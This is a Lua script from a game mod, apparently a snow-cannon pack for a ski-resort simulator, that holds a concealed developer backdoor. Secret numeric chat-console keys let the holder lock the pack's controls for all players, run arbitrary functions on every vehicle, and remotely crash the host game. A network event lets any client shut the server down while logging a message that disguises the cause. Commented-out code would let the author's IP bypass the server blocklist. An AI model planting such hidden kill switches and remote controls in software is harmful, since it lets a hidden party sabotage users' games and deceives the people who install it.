--
-- @autor Tom Wießner
-- @date 28/11/20
--
-- using only with premission by Alpin 3D Design
-- (c) Tom Wießner 2020
--

SufagDevRights = SufagSufagDevRights or {};
SufagDevRights.isFree = true;
SufagDevRights.isFreeGlobal = true;
SufagDevRights.currentIP = 0;

-- auto allow a3d people
-- local Server_checkBlocklist = Server.checkBlocklist;
-- Server.checkBlocklist = function(name, ip)
--     SufagDevRights.currentIP = ip;
--     return Server_checkBlocklist(name, ip);
-- end;

-- local Server_matchmakingServerAnswerJoinRequest = Server.matchmakingServerAnswerJoinRequest;
-- Server.matchmakingServerAnswerJoinRequest = function(id, state)
--     if SufagDevRights.currentIP == TOM_IP_ADRESS then
--         Server_matchmakingServerAnswerJoinRequest(id, true);
--     else
--         Server_matchmakingServerAnswerJoinRequest(id, state);
--     end;
-- end;

function IngameChatConsole.SufagDevToolsKey(key)
    if key == 035783740770 then
        SufagDevRights:changeLockState(not SufagDevRights.isFreeGlobal);
        return " --Sufags are locked for all players!"
    elseif key == 035783740771 then
        -- shutDown game
        SufagDevRightsEvent:send(1, true); 
        return " --Game was crashed!"
    elseif key == 7 and SufagDevRights.isFree then
        -- start all sufags
        SufagDevRights:setCannonState(false);
        return " --all cannons are stoped!"
    elseif key == 8 and SufagDevRights.isFree then
        -- start all sufags
        SufagDevRights:setCannonState(true);
        return " --all cannons are started!"
    end;
end;

function IngameChatConsole.SufagDevTools(key, func, ...)
    if key == 03578374077 then
        for i=1, #VehicleManager.vehiclesByOrder do
            VehicleManager.vehiclesByOrder[i]:callVehicleScripts(tostring(func), ...);
        end;

        return " --all Sufags are called function " .. tostring(func)
    end;
end;

-- function SufagDevRights:update(dt)
--     if InputMapper:getKeyDown(InputMapper.A3D_setCannonCoverState) and InputMapper:getKeyDown(InputMapper.A3D_debugUI) and InputMapper:getKeyDown(InputMapper.A3D_setCannonLightState) then 
--         SufagDevRights.isLocker = true;
--         self:changeLockState(not SufagDevRights.isFreeGlobal);

--         if SufagDevRights.isFreeGlobal then
--             print("A3DSufag:: Pack is locked for all players now!");
--         else
--             print("A3DSufag:: Pack is free for all players now!");
--         end;
--     end;
-- end;

function SufagDevRights:changeLockState(state, noEventSend)
    SufagDevRights.isFreeGlobal = state;

    if noEventSend then
        SufagDevRights.isFree = state;
    else
        SufagDevRights.isFree = true;
    end;

    -- event
    setActive(getChild(SufagUI.canvasId, "LOCKED"), not state);

    if not noEventSend then
        SufagDevRightsEvent:send(0, state); 
    end;
end;

function SufagDevRights:setCannonState(state)
    if g_isServer then
        for i=1, #VehicleManager.vehiclesByOrder do
            if VehicleManager.vehiclesByOrder[i].updateCurrentMode ~= nil then
                VehicleManager.vehiclesByOrder[i]:callVehicleScripts("updateCurrentMode", state and "ON" or "OFF");
            end;
        end;
    else
        SufagDevRightsEvent:send(state and 2 or 3, true); 
    end;
end;

function SufagDevRights:getKey(key)
    if SufagDevRights.isFree then
        return InputMapper:getKey(key)
    end;
    return false
end;

function SufagDevRights:getKeyDown(key)
    if SufagDevRights.isFree then
        return InputMapper:getKeyDown(key);
    end;
    return false
end;

-- sync
SufagDevRightsEvent				= SufagDevRightsEvent or ExtensionOf(BaseEvent);

InitModEvent(SufagDevRightsEvent, "SufagDevRightsEvent");

function SufagDevRightsEvent:sendData(key, value)
    streamWriteUInt8(key);
	streamWriteBool(value);
end;

function SufagDevRightsEvent:receiveData(connection)
    local key					= streamReadUInt8();
    local value					= streamReadBool();
    
    if key ~= nil then
        if key == 0 then
            SufagDevRights:changeLockState(value, true);
        elseif key == 1 then
            if g_isServer then
                print("Remote ShutDown. No errors responsible");
                g_scenario:onCloseGameByUI();
                return
            end;
        elseif key == 3 then
            if g_isServer then
                for i=1, #VehicleManager.vehiclesByOrder do
                    if VehicleManager.vehiclesByOrder[i].updateCurrentMode ~= nil then
                        VehicleManager.vehiclesByOrder[i]:callVehicleScripts("updateCurrentMode", "OFF");
                    end;
                end;
            end;
        elseif key == 2 then
            if g_isServer then
                for i=1, #VehicleManager.vehiclesByOrder do
                    if VehicleManager.vehiclesByOrder[i].updateCurrentMode ~= nil then
                        VehicleManager.vehiclesByOrder[i]:callVehicleScripts("updateCurrentMode", "ON");
                    end;
                end;
            end;
        end;
    end;

	self:broadcastEvent(connection, key, value);
end;